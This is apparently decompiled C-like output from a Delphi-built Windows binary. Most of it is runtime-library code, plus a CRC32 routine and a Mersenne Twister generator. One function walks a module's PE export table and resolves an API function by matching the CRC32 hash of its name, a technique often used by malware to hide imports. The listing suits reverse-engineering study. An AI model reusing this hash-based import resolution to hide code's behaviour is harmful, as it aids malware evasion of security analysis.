void FUN_00402b80(int param_1,int param_2,undefined4 *param_3,int *param_4)

{
  int iVar1;
  int iVar2;
  
  if ((param_1 != 0) && (iVar1 = *(int *)(param_1 + -4), iVar1 != 0)) {
    iVar2 = param_2 + -1;
    if (param_2 < 1) {
      iVar2 = 0;
    }
    else if (iVar1 <= iVar2) goto LAB_00402bb2;
    if (-1 < (int)param_3) {
      if ((int)(undefined4 *)(iVar1 - iVar2) < (int)param_3) {
        param_3 = (undefined4 *)(iVar1 - iVar2);
      }
      FUN_00402778(param_4,(undefined4 *)(iVar2 + param_1),param_3);
      return;
    }
  }
LAB_00402bb2:
  FUN_0040268c(param_4);
  return;
}



void FUN_00402bc0(int *param_1,int param_2,int param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  thunk_FUN_00402b30(param_1);
  iVar1 = *param_1;
  if (iVar1 != 0) {
    iVar3 = param_2 + -1;
    if (((0 < param_2) && (iVar3 < *(int *)(iVar1 + -4))) && (0 < param_3)) {
      iVar2 = *(int *)(iVar1 + -4) - iVar3;
      if (iVar2 < param_3) {
        param_3 = iVar2;
      }
      FUN_00401318((undefined4 *)(param_3 + (int)(undefined4 *)(iVar1 + iVar3)),
                   (undefined4 *)(iVar1 + iVar3),(undefined4 *)(iVar2 - param_3));
      FUN_00402cac(param_1,(undefined4 *)(*(int *)(*param_1 + -4) - param_3));
    }
  }
  return;
}



char * FUN_00402c64(char *param_1,char *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  char *pcVar5;
  char *pcVar6;
  bool bVar7;
  
  if (param_1 != (char *)0x0) {
    if (param_2 == (char *)0x0) {
      return (char *)0x0;
    }
    iVar3 = *(int *)(param_1 + -4) + -1;
    if (-1 < iVar3) {
      iVar1 = *(int *)(param_2 + -4) - iVar3;
      bVar7 = iVar1 == 0;
      pcVar5 = param_2;
      if (!bVar7 && iVar3 <= *(int *)(param_2 + -4)) {
LAB_00402c84:
        do {
          if (iVar1 != 0) {
            iVar1 = iVar1 + -1;
            pcVar4 = pcVar5 + 1;
            bVar7 = *param_1 == *pcVar5;
            pcVar5 = pcVar4;
            if (!bVar7) goto LAB_00402c84;
          }
          iVar2 = iVar3;
          pcVar4 = param_1 + 1;
          pcVar6 = pcVar5;
          if (!bVar7) break;
          do {
            if (iVar2 == 0) break;
            bVar7 = *pcVar4 == *pcVar6;
            iVar2 = iVar2 + -1;
            pcVar4 = pcVar4 + 1;
            pcVar6 = pcVar6 + 1;
          } while (bVar7);
          if (bVar7) {
            return pcVar5 + -(int)param_2;
          }
        } while( true );
      }
    }
    param_1 = (char *)0x0;
  }
  return param_1;
}



void FUN_00402cac(int *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iStack_10;
  
  puVar3 = (undefined4 *)0x0;
  if (0 < (int)param_2) {
    iStack_10 = *param_1;
    if ((iStack_10 != 0) && (*(int *)(iStack_10 + -8) == 1)) {
      iStack_10 = iStack_10 + -8;
      FUN_00401208(&iStack_10,(int)param_2 + 9);
      *param_1 = iStack_10 + 8;
      *(undefined4 **)(iStack_10 + 4) = param_2;
      *(undefined *)((int)param_2 + iStack_10 + 8) = 0;
      return;
    }
    iStack_10 = 0x402ce9;
    puVar3 = FUN_0040274c((int)param_2);
    puVar1 = (undefined4 *)*param_1;
    if (puVar1 != (undefined4 *)0x0) {
      puVar2 = (undefined4 *)puVar1[-1];
      if ((int)param_2 <= (int)(undefined4 *)puVar1[-1]) {
        puVar2 = param_2;
      }
      iStack_10 = 0x402d01;
      FUN_00401318(puVar1,puVar3,puVar2);
    }
  }
  iStack_10 = 0x402d08;
  FUN_0040268c(param_1);
  *param_1 = (int)puVar3;
  return;
}



BSTR * FUN_00402d58(BSTR *param_1,OLECHAR *param_2)

{
  BSTR bstrString;
  BSTR *ppOVar1;
  
  if ((param_2 != (OLECHAR *)0x0) && (*(uint *)(param_2 + -2) >> 1 != 0)) {
    ppOVar1 = (BSTR *)SysReAllocStringLen(param_1,param_2,*(uint *)(param_2 + -2) >> 1);
    if (ppOVar1 != (BSTR *)0x0) {
      return ppOVar1;
    }
    ppOVar1 = (BSTR *)FUN_004012b0(1);
    return ppOVar1;
  }
  bstrString = *param_1;
  if (bstrString != (BSTR)0x0) {
    *param_1 = (BSTR)0x0;
    SysFreeString(bstrString);
  }
  return param_1;
}



int FUN_00402e40(int param_1,int param_2)

{
  bool bVar1;
  undefined4 *puVar2;
  int iVar3;
  int iVar4;
  
  puVar2 = (undefined4 *)(*(byte *)(param_2 + 1) + 10 + param_2);
  iVar3 = *(int *)(*(byte *)(param_2 + 1) + 6 + param_2);
  do {
    FUN_00402e74((int **)(puVar2[1] + param_1),*(char **)*puVar2,1);
    puVar2 = puVar2 + 2;
    iVar4 = iVar3 + -1;
    bVar1 = 0 < iVar3;
    iVar3 = iVar4;
  } while (iVar4 != 0 && bVar1);
  return param_1;
}



int ** FUN_00402e74(int **param_1,char *param_2,int param_3)

{
  char cVar1;
  bool bVar2;
  int **ppiVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  
  if (param_3 != 0) {
    cVar1 = *param_2;
    uVar4 = (uint)(byte)param_2[1];
    if (cVar1 == '\n') {
      if (param_3 < 2) {
        FUN_0040268c((int *)param_1);
      }
      else {
        FUN_004026b0((int *)param_1,param_3);
      }
    }
    else if (cVar1 == '\v') {
      if (param_3 < 2) {
        (*(code *)PTR_FUN_0040902c)();
      }
      else {
        (*(code *)PTR_FUN_00409030)(param_1,param_3);
      }
    }
    else {
      ppiVar3 = param_1;
      if (cVar1 == '\f') {
        do {
          FUN_004031f4(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 4;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else if (cVar1 == '\r') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_00402e74(ppiVar3,**(char ***)(param_2 + uVar4 + 10),*(int *)(param_2 + uVar4 + 6));
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0e') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_00402e40((int)ppiVar3,(int)param_2);
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0f') {
        do {
          FUN_00403484(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else {
        if (cVar1 != '\x11') {
          ppiVar3 = (int **)FUN_004012b0(CONCAT31((int3)((uint)param_1 >> 8),2));
          return ppiVar3;
        }
        do {
          FUN_004033f0(ppiVar3,(int)param_2);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
    }
  }
  return param_1;
}



void FUN_00402f60(void)

{
  return;
}



void FUN_00402f64(int param_1,int param_2,int param_3)

{
  char cVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  undefined4 *puVar6;
  uint uVar7;
  undefined4 *puVar8;
  int iVar9;
  
  puVar8 = (undefined4 *)(*(byte *)(param_3 + 1) + 10 + param_3);
  iVar9 = puVar8[-1];
  iVar5 = 0;
  iVar2 = puVar8[-2];
  do {
    puVar6 = (undefined4 *)(puVar8[1] - iVar5);
    if (puVar6 != (undefined4 *)0x0 && iVar5 <= (int)puVar8[1]) {
      FUN_00401318((undefined4 *)(iVar5 + param_2),(undefined4 *)(iVar5 + param_1),puVar6);
    }
    iVar3 = puVar8[1];
    pcVar4 = *(char **)*puVar8;
    cVar1 = *pcVar4;
    if (cVar1 == '\n') {
      FUN_004026e0((int *)(iVar3 + param_1),*(undefined4 **)(iVar3 + param_2));
      iVar5 = 4;
    }
    else if (cVar1 == '\v') {
      FUN_00402d58((BSTR *)(iVar3 + param_1),*(OLECHAR **)(iVar3 + param_2));
      iVar5 = 4;
    }
    else if (cVar1 == '\f') {
      FUN_004031ec();
      iVar5 = 0x10;
    }
    else if (cVar1 == '\r') {
      uVar7 = (uint)(byte)pcVar4[1];
      iVar5 = *(int *)(pcVar4 + uVar7 + 2);
      FUN_00403080((int **)(iVar3 + param_1),(OLECHAR **)(iVar3 + param_2),
                   **(char ***)(pcVar4 + uVar7 + 10),*(int *)(pcVar4 + uVar7 + 6));
    }
    else if (cVar1 == '\x0e') {
      iVar5 = *(int *)(pcVar4 + (byte)pcVar4[1] + 2);
      FUN_00402f64(iVar3 + param_1,iVar3 + param_2,(int)pcVar4);
    }
    else if (cVar1 == '\x0f') {
      FUN_0040349c((int **)(iVar3 + param_1),*(int ***)(iVar3 + param_2));
      iVar5 = 4;
    }
    else {
      if (cVar1 != '\x11') {
        FUN_004012b0(CONCAT31((int3)((uint)iVar3 >> 8),2));
        return;
      }
      FUN_0040342c((int *)(iVar3 + param_1),*(int *)(iVar3 + param_2),(int)pcVar4);
      iVar5 = 4;
    }
    iVar5 = iVar5 + puVar8[1];
    puVar8 = puVar8 + 2;
    iVar9 = iVar9 + -1;
  } while (iVar9 != 0);
  puVar8 = (undefined4 *)(iVar2 - iVar5);
  if (puVar8 != (undefined4 *)0x0 && iVar5 <= iVar2) {
    FUN_00401318((undefined4 *)(iVar5 + param_2),(undefined4 *)(iVar5 + param_1),puVar8);
  }
  return;
}



void FUN_00403080(int **param_1,OLECHAR **param_2,char *param_3,int param_4)

{
  int *piVar1;
  char cVar2;
  
  cVar2 = *param_3;
  if (cVar2 == '\n') {
    do {
      FUN_004026e0((int *)param_1,(undefined4 *)*param_2);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\v') {
    do {
      FUN_00402d58((BSTR *)param_1,*param_2);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\f') {
    do {
      FUN_004031ec();
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\r') {
    piVar1 = (int *)(param_3 + (byte)param_3[1] + 2);
    do {
      FUN_00403080(param_1,param_2,(char *)piVar1[2],piVar1[1]);
      param_1 = (int **)((int)param_1 + *piVar1);
      param_2 = (OLECHAR **)((int)param_2 + *piVar1);
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\x0e') {
    do {
      FUN_00402f64((int)param_1,(int)param_2,(int)param_3);
      param_1 = (int **)((int)param_1 + *(int *)(param_3 + (byte)param_3[1] + 2));
      param_2 = (OLECHAR **)((int)param_2 + *(int *)(param_3 + (byte)param_3[1] + 2));
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\x0f') {
    do {
      FUN_0040349c(param_1,(int **)*param_2);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else {
    if (cVar2 != '\x11') {
      FUN_004012b0(CONCAT31((int3)((uint)param_1 >> 8),2));
      return;
    }
    do {
      FUN_0040342c((int *)param_1,(int)*param_2,(int)param_3);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  return;
}



LPWSTR FUN_00403174(undefined *param_1,LPWSTR param_2,int param_3)

{
  int iVar1;
  LPCSTR pCVar2;
  
  iVar1 = FUN_0040292c((int)param_1);
  pCVar2 = FUN_00402b24(param_1);
  iVar1 = FUN_004027c4(param_2,param_3 + -1,pCVar2,iVar1);
  param_2[iVar1] = L'\0';
  return param_2;
}



void thunk_FUN_004012b0(uint param_1)

{
  FUN_004012b0(CONCAT31((int3)(param_1 >> 8),0x10));
  return;
}



void FUN_004031c4(void)

{
  int iVar1;
  
  iVar1 = 0;
  do {
    (&DAT_0040b5cc)[iVar1] = thunk_FUN_004012b0;
    iVar1 = iVar1 + 1;
  } while (iVar1 != 0x2b);
  DAT_0040b5cc = &LAB_004031ac;
  return;
}



void FUN_004031e4(void)

{
                    // WARNING: Could not recover jumptable at 0x004031e4. Too many branches
                    // WARNING: Treating indirect jump as call
  (*DAT_0040b5cc)();
  return;
}



void FUN_004031ec(void)

{
                    // WARNING: Could not recover jumptable at 0x004031ec. Too many branches
                    // WARNING: Treating indirect jump as call
  (*DAT_0040b5d0)();
  return;
}



undefined4 FUN_004031f4(undefined4 param_1)

{
  FUN_004031e4();
  return param_1;
}



int FUN_00403204(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  return param_1 * param_4;
}



int FUN_00403228(int param_1)

{
  if (param_1 != 0) {
    param_1 = *(int *)(param_1 + -4);
  }
  return param_1;
}



int FUN_00403230(int param_1)

{
  int iVar1;
  
  iVar1 = FUN_00403228(param_1);
  return iVar1 + -1;
}



void FUN_00403238(int **param_1,OLECHAR **param_2,char *param_3,int param_4)

{
  FUN_00403080(param_1,param_2,param_3,param_4);
  return;
}



int ** thunk_FUN_00402e74(int **param_1,char *param_2,int param_3)

{
  char cVar1;
  bool bVar2;
  int **ppiVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  
  if (param_3 != 0) {
    cVar1 = *param_2;
    uVar4 = (uint)(byte)param_2[1];
    if (cVar1 == '\n') {
      if (param_3 < 2) {
        FUN_0040268c((int *)param_1);
      }
      else {
        FUN_004026b0((int *)param_1,param_3);
      }
    }
    else if (cVar1 == '\v') {
      if (param_3 < 2) {
        (*(code *)PTR_FUN_0040902c)();
      }
      else {
        (*(code *)PTR_FUN_00409030)(param_1,param_3);
      }
    }
    else {
      ppiVar3 = param_1;
      if (cVar1 == '\f') {
        do {
          FUN_004031f4(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 4;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else if (cVar1 == '\r') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_00402e74(ppiVar3,**(char ***)(param_2 + uVar4 + 10),*(int *)(param_2 + uVar4 + 6));
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0e') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_00402e40((int)ppiVar3,(int)param_2);
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0f') {
        do {
          FUN_00403484(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else {
        if (cVar1 != '\x11') {
          ppiVar3 = (int **)FUN_004012b0(CONCAT31((int3)((uint)param_1 >> 8),2));
          return ppiVar3;
        }
        do {
          FUN_004033f0(ppiVar3,(int)param_2);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
    }
  }
  return param_1;
}



void FUN_00403250(undefined4 *param_1,int param_2)

{
  FUN_004033f0(param_1,param_2);
  return;
}



void FUN_00403258(int **param_1,int param_2,int param_3,int *param_4)

{
  char **ppcVar1;
  int *piVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  int *local_24;
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  int **local_8;
  
  piVar2 = *param_1;
  iVar5 = *param_4;
  local_c = param_3;
  local_8 = param_1;
  if (iVar5 < 1) {
    if (iVar5 < 0) {
      FUN_004012b0(CONCAT31((int3)((uint)param_4 >> 8),4));
    }
    FUN_00403250(local_8,param_2);
  }
  else {
    local_14 = 0;
    if (piVar2 != (int *)0x0) {
      local_14 = piVar2[-1];
      piVar2 = piVar2 + -2;
    }
    iVar3 = param_2 + (uint)*(byte *)(param_2 + 1);
    local_1c = *(int *)(iVar3 + 2);
    ppcVar1 = *(char ***)(iVar3 + 6);
    if (ppcVar1 == (char **)0x0) {
      pcVar4 = (char *)0x0;
    }
    else {
      pcVar4 = *ppcVar1;
    }
    local_20 = iVar5 * local_1c;
    if (local_20 / iVar5 != local_1c) {
      FUN_004012b0(CONCAT31((int3)((uint)(local_20 / iVar5) >> 8),4));
    }
    local_20 = local_20 + 8;
    if ((piVar2 == (int *)0x0) || (*piVar2 == 1)) {
      local_24 = piVar2;
      if ((iVar5 < local_14) && (pcVar4 != (char *)0x0)) {
        thunk_FUN_00402e74((int **)((int)piVar2 + iVar5 * local_1c + 8),pcVar4,local_14 - iVar5);
      }
      FUN_00401208((int *)&local_24,local_20);
      piVar2 = local_24;
    }
    else {
      *piVar2 = *piVar2 + -1;
      piVar2 = (int *)FUN_004011d8(local_20);
      local_18 = local_14;
      if (iVar5 < local_14) {
        local_18 = iVar5;
      }
      if (pcVar4 == (char *)0x0) {
        FUN_00401318(*local_8,piVar2 + 2,(undefined4 *)(local_18 * local_1c));
      }
      else {
        FUN_004019d0(piVar2 + 2,local_18 * local_1c,0);
        FUN_00403238((int **)(piVar2 + 2),(OLECHAR **)*local_8,pcVar4,local_18);
      }
    }
    *piVar2 = 1;
    piVar2[1] = iVar5;
    piVar2 = piVar2 + 2;
    FUN_004019d0((int *)(local_1c * local_14 + (int)piVar2),(iVar5 - local_14) * local_1c,0);
    if (1 < local_c) {
      local_c = local_c + -1;
      if (-1 < iVar5 + -1) {
        local_10 = 0;
        do {
          FUN_00403258((int **)(piVar2 + local_10),(int)pcVar4,local_c,param_4 + 1);
          local_10 = local_10 + 1;
          iVar5 = iVar5 + -1;
        } while (iVar5 != 0);
      }
    }
    *local_8 = piVar2;
  }
  return;
}



void FUN_004033e4(int **param_1,int param_2,int param_3)

{
  FUN_00403258(param_1,param_2,param_3,(int *)&stack0x00000004);
  return;
}



undefined4 * FUN_004033f0(undefined4 *param_1,int param_2)

{
  int **ppiVar1;
  char **ppcVar2;
  int **ppiVar3;
  
  ppiVar3 = (int **)*param_1;
  if (ppiVar3 != (int **)0x0) {
    *param_1 = 0;
    ppiVar1 = ppiVar3 + -2;
    *ppiVar1 = (int *)((int)*ppiVar1 + -1);
    if (*ppiVar1 == (int *)0x0) {
      ppcVar2 = *(char ***)(*(byte *)(param_2 + 1) + 6 + param_2);
      if ((ppcVar2 != (char **)0x0) && (ppiVar3[-1] != (int *)0x0)) {
        ppiVar3 = FUN_00402e74(ppiVar3,*ppcVar2,(int)ppiVar3[-1]);
      }
      FUN_004011f0((int)(ppiVar3 + -2));
    }
  }
  return param_1;
}



void FUN_0040342c(int *param_1,int param_2,int param_3)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *param_1;
  if (param_2 != 0) {
    *(int *)(param_2 + -8) = *(int *)(param_2 + -8) + 1;
  }
  if (iVar2 != 0) {
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      *(int *)(iVar2 + -8) = *(int *)(iVar2 + -8) + 1;
      FUN_004033f0(param_1,param_3);
    }
  }
  *param_1 = param_2;
  return;
}



void FUN_00403454(undefined4 *param_1)

{
  *param_1 = DAT_00409020;
  DAT_00409020 = param_1;
  return;
}



void FUN_00403464(int param_1)

{
  int *piVar1;
  
  piVar1 = DAT_00409024;
  if (DAT_00409024 != (int *)0x0) {
    do {
      (*(code *)piVar1[1])(*(undefined4 *)(param_1 + 4));
      piVar1 = (int *)*piVar1;
    } while (piVar1 != (int *)0x0);
  }
  return;
}



int ** FUN_00403484(int **param_1)

{
  int **ppiVar1;
  
  ppiVar1 = (int **)*param_1;
  if (ppiVar1 != (int **)0x0) {
    *param_1 = (int *)0x0;
    (*(code *)(*ppiVar1)[2])();
    param_1 = ppiVar1;
  }
  return param_1;
}



void FUN_0040349c(int **param_1,int **param_2)

{
  int *piVar1;
  
  if (param_2 == (int **)0x0) {
    piVar1 = *param_1;
    *param_1 = (int *)0x0;
    if (piVar1 != (int *)0x0) {
      (**(code **)(*piVar1 + 8))();
    }
    return;
  }
  (*(code *)(*param_2)[1])();
  piVar1 = *param_2;
  *param_2 = (int *)param_1;
  if (piVar1 == (int *)0x0) {
    return;
  }
  (**(code **)(*piVar1 + 8))();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004034c8(void)

{
  undefined *puVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_10;
  undefined *puStack_c;
  undefined *puStack_8;
  
  puStack_8 = &stack0xfffffffc;
  puStack_c = &LAB_00403504;
  uStack_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_10;
  _DAT_0040b594 = _DAT_0040b594 + 1;
  if (_DAT_0040b594 == 0) {
    puVar1 = &stack0xfffffffc;
    if (DAT_0040b5c8 != (code *)0x0) {
      (*DAT_0040b5c8)();
      puVar1 = puStack_8;
    }
    puStack_8 = puVar1;
    (*(code *)PTR_FUN_00409040)();
  }
  *in_FS_OFFSET = uStack_10;
  return;
}



void FUN_00403540(SIZE_T param_1)

{
  LocalAlloc(0x40,param_1);
  return;
}



undefined4 FUN_0040354c(void)

{
  return 8;
}



void FUN_00403554(void)

{
  SIZE_T SVar1;
  LPVOID lpTlsValue;
  
  SVar1 = FUN_0040354c();
  if (SVar1 != 0) {
    if (_tls_index == 0xffffffff) {
      FUN_00402604(0xe2);
    }
    lpTlsValue = (LPVOID)FUN_00403540(SVar1);
    if (lpTlsValue == (LPVOID)0x0) {
      FUN_00402604(0xe2);
    }
    else {
      TlsSetValue(_tls_index,lpTlsValue);
    }
  }
  return;
}



LPVOID FUN_00403598(void)

{
  LPVOID pvVar1;
  int in_FS_OFFSET;
  
  if (DAT_0040b678 == '\0') {
    return *(LPVOID *)(*(int *)(in_FS_OFFSET + 0x2c) + _tls_index * 4);
  }
  pvVar1 = TlsGetValue(_tls_index);
  if (pvVar1 != (LPVOID)0x0) {
    return pvVar1;
  }
  FUN_00403554();
  pvVar1 = TlsGetValue(_tls_index);
  if (pvVar1 != (LPVOID)0x0) {
    return pvVar1;
  }
  return DAT_0040b68c;
}



void FUN_004035d8(void)

{
  FUN_00403454((undefined4 *)&DAT_00409094);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004035e4(undefined4 param_1)

{
  _tls_index = 0;
  _DAT_00409098 = GetModuleHandleA((LPCSTR)0x0);
  _DAT_0040909c = 0;
  _DAT_004090a0 = 0;
  DAT_0040b684 = _DAT_00409098;
  FUN_004035d8();
  FUN_004024bc(param_1,0x409094);
  return;
}



void FUN_00403660(void)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  uint *puVar4;
  
  uVar2 = 0;
  puVar4 = &DAT_0040b694;
  do {
    iVar3 = 8;
    uVar1 = uVar2;
    do {
      if ((uVar1 & 1) == 0) {
        uVar1 = uVar1 >> 1;
      }
      else {
        uVar1 = uVar1 >> 1 ^ 0xedb88320;
      }
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    *puVar4 = uVar1;
    uVar2 = uVar2 + 1;
    puVar4 = puVar4 + 1;
  } while (uVar2 < 0x100);
  return;
}



uint FUN_00403694(undefined4 *param_1,uint param_2)

{
  byte bVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  
  uVar3 = 0xffffffff;
  for (uVar4 = param_2 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    uVar2 = *param_1;
    uVar3 = uVar3 >> 8 ^ (&DAT_0040b694)[(byte)((byte)uVar3 ^ (byte)uVar2)];
    uVar3 = uVar3 >> 8 ^ (&DAT_0040b694)[(byte)((byte)uVar3 ^ (byte)((uint)uVar2 >> 8))];
    uVar3 = uVar3 >> 8 ^ (&DAT_0040b694)[(byte)((byte)uVar3 ^ (byte)((uint)uVar2 >> 0x10))];
    uVar3 = uVar3 >> 8 ^ (&DAT_0040b694)[(byte)((byte)uVar3 ^ (byte)((uint)uVar2 >> 0x18))];
    param_1 = param_1 + 1;
  }
  for (uVar4 = param_2 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
    bVar1 = *(byte *)param_1;
    param_1 = (undefined4 *)((int)param_1 + 1);
    uVar3 = uVar3 >> 8 ^ (&DAT_0040b694)[(byte)((byte)uVar3 ^ bVar1)];
  }
  return uVar3 ^ 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040370c(void)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined auStack_10 [12];
  
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = auStack_10;
  _DAT_0040b690 = _DAT_0040b690 + 1;
  *in_FS_OFFSET = uVar1;
  return;
}



void FUN_00403744(uint param_1)

{
  int iVar1;
  undefined4 *puVar2;
  uint uVar3;
  int iVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  int local_10;
  int local_c;
  uint local_8;
  
  puStack_20 = &stack0xfffffffc;
  local_10 = 0;
  puStack_24 = &LAB_00403866;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  iVar1 = DAT_0040ba94 + *(int *)(*(int *)(DAT_0040ba94 + 0x3c) + DAT_0040ba94 + 0x78);
  iVar4 = 0;
  local_c = 0;
  local_8 = param_1;
  do {
    puVar2 = (undefined4 *)
             (DAT_0040ba94 + *(int *)(iVar4 * 4 + DAT_0040ba94 + *(int *)(iVar1 + 0x20)));
    FUN_00402878(&local_10,puVar2);
    uVar3 = FUN_0040292c(local_10);
    uVar3 = FUN_00403694(puVar2,uVar3);
    if (uVar3 == local_8) {
      local_c = *(int *)(DAT_0040ba94 +
                        (uint)*(ushort *)(DAT_0040ba94 + iVar4 * 2 + *(int *)(iVar1 + 0x24)) * 4 +
                        *(int *)(iVar1 + 0x1c)) + DAT_0040ba94;
    }
    iVar4 = iVar4 + 1;
  } while ((local_c == 0) && (iVar4 != *(int *)(iVar1 + 0x18)));
  *in_FS_OFFSET = uStack_28;
  puStack_20 = &LAB_0040386d;
  puStack_24 = (undefined *)0x403865;
  FUN_0040268c(&local_10);
  return;
}



void FUN_004038b0(uint param_1)

{
  uint uVar1;
  int iVar2;
  uint *puVar3;
  
  iVar2 = 0x270;
  puVar3 = &DAT_0040baa0;
  do {
    *puVar3 = param_1 & 0xffff0000;
    uVar1 = param_1 * 0x10dcd + 1;
    *puVar3 = *puVar3 | uVar1 >> 0x10;
    param_1 = uVar1 * 0x10dcd + 1;
    puVar3 = puVar3 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  DAT_004090ac = 0x270;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint FUN_004038f4(void)

{
  uint *puVar1;
  int iVar2;
  uint uVar3;
  
  if (0x26f < DAT_004090ac) {
    if (DAT_004090ac == 0x271) {
      FUN_004038b0(0x1105);
    }
    iVar2 = 0xe3;
    puVar1 = &DAT_0040baa0;
    do {
      *puVar1 = (*puVar1 & 0x80000000 | puVar1[1] & 0x7fffffff) >> 1 ^ puVar1[0x18d] ^
                *(uint *)(&DAT_004090b0 + (puVar1[1] & 1) * 4);
      puVar1 = puVar1 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    iVar2 = 0x18c;
    puVar1 = &DAT_0040be2c;
    do {
      *puVar1 = (*puVar1 & 0x80000000 | puVar1[1] & 0x7fffffff) >> 1 ^ puVar1[-0xe3] ^
                *(uint *)(&DAT_004090b0 + (puVar1[1] & 1) * 4);
      puVar1 = puVar1 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    DAT_0040c45c = (DAT_0040c45c & 0x80000000 | DAT_0040baa0 & 0x7fffffff) >> 1 ^ _DAT_0040c0d0 ^
                   *(uint *)(&DAT_004090b0 + (DAT_0040baa0 & 1) * 4);
    DAT_004090ac = 0;
  }
  puVar1 = &DAT_0040baa0 + DAT_004090ac;
  DAT_004090ac = DAT_004090ac + 1;
  uVar3 = *puVar1 ^ *puVar1 >> 0xb;
  uVar3 = uVar3 ^ (uVar3 & 0x13a58ad) << 7;
  uVar3 = uVar3 ^ (uVar3 & 0x1df8c) << 0xf;
  return uVar3 ^ uVar3 >> 0x12;
}



void FUN_00403a04(void)

{
  undefined4 uVar1;
  
  uVar1 = *(undefined4 *)PTR_DAT_0040a6e8;
  FUN_004014c4();
  FUN_004038b0(*(uint *)PTR_DAT_0040a6e8);
  *(undefined4 *)PTR_DAT_0040a6e8 = uVar1;
  return;
}



undefined4 FUN_00403a28(uint param_1)

{
  uint uVar1;
  
  uVar1 = FUN_004038f4();
  return (int)((ulonglong)uVar1 * (ulonglong)param_1 >> 0x20);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403a34(void)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined auStack_10 [12];
  
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = auStack_10;
  _DAT_0040ba9c = _DAT_0040ba9c + 1;
  *in_FS_OFFSET = uVar1;
  return;
}



